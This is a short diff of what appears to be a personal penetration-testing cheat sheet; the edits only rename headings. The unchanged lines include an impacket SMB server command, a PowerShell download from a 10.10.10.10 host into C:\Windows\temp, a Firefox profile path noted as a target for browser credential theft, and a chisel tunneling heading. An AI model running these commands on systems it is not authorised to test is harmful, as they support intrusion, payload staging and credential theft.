@@ -99,7 +99,8 @@ base64
 copy contents of file to clipboard
 `Get-Content <FILENAME> | Set-Clipboard`
 
-#### network file transfers
+
+# network file transfers
 smb setup on nix
 `$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`
 
@@ -126,7 +127,6 @@ shorthand
 `powershell IWR -url http://10.10.10.10:9000/file.txt -OutFile C:\\Windows\\temp\\file.txt`
 
 
-
 ### smb
 localhost
 `sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1
@@ -145,8 +145,8 @@ C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release
 sharpweb?
 python cracker?
 
-### file transfer
 
+# Useful Commands
 
 
 ### chisel
